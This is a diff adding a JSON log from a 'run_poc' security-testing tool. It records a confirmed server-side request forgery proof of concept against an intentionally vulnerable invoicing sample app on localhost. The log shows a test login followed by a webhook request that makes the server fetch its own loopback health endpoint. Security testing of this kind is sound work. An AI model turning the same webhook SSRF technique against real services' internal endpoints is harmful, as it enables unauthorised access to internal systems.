@@ -1,0 +1,73 @@
+{
+  "tool": "run_poc",
+  "version": "1.0.0",
+  "finding": "F-13",
+  "poc_file": "ssrf-webhook-test.json",
+  "target": "http://127.0.0.1:5057",
+  "permission": "Example run: the skill's author started the deliberately vulnerable sample app on 127.0.0.1:5057 for this run and allowed safe PoCs against it",
+  "allow_hosts": [],
+  "started_at": "2026-11-10T04:26:52Z",
+  "finished_at": "2026-11-10T04:26:53Z",
+  "safety": {
+    "checked": true,
+    "issues": []
+  },
+  "steps": [
+    {
+      "name": "login as alice",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:5057/login",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "email=alice%40example.test&password=alice-test-pw"
+      },
+      "response": {
+        "status": 302,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "text/html; charset=utf-8",
+          "Content-Length": "205",
+          "Location": "/invoices",
+          "Set-Cookie": "session=<redacted>; HttpOnly; Path=/"
+        },
+        "body_excerpt": "<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href=\"/invoices\">/invoices</a>. If not, click the link.\n",
+        "body_length": 205,
+        "elapsed_ms": 531
+      },
+      "expect_status_met": true
+    },
+    {
+      "name": "fetch loopback URL",
+      "request": {
+        "method": "POST",
+        "url": "http://127.0.0.1:5057/webhooks/test",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"url\": \"http://127.0.0.1:5057/healthz\"}"
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "Werkzeug/3.0.1 Python/3.12.10",
+          "Content-Type": "application/json",
+          "Content-Length": "36"
+        },
+        "body_excerpt": "{\"body\":\"invoicer-ok\",\"status\":200}\n",
+        "body_length": 36,
+        "elapsed_ms": 38
+      },
+      "expect_status_met": null
+    }
+  ],
+  "proof": {
+    "type": "marker_in_response",
+    "step": "fetch loopback URL",
+    "marker": "invoicer-ok",
+    "passed": true,
+    "observed": "marker found in the response to 'fetch loopback URL'"
+  },
+  "result": "confirmed"
+}
